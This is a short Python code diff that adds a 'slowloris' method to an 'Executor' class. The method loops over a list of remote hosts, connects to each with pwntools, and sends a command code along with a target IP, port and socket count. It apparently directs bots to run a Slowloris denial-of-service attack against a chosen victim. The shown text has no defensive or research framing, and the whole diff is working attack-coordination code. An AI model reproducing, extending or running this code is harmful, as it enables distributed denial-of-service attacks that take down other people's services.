@@ -37,3 +37,22 @@ class Executor:
             
         return fail
         
+    def slowloris(self, data, ip, port, sockets):
+        print(data)
+        fail = list()
+        
+        for i in data:
+            print(i)
+            try:
+                instance = pwn.remote(i['ip'], i['port'], timeout=6)
+                instance.sendline(b'2') 
+                instance.sendline(bytes(ip, encoding='utf-8'))
+                instance.sendline(bytes(port, encoding='utf-8'))
+                instance.sendline(bytes(sockets, encoding='utf-8'))
+                instance.close()
+            
+            except Exception as e:
+                print(e)
+                fail.append(i)
+        
+        return fail
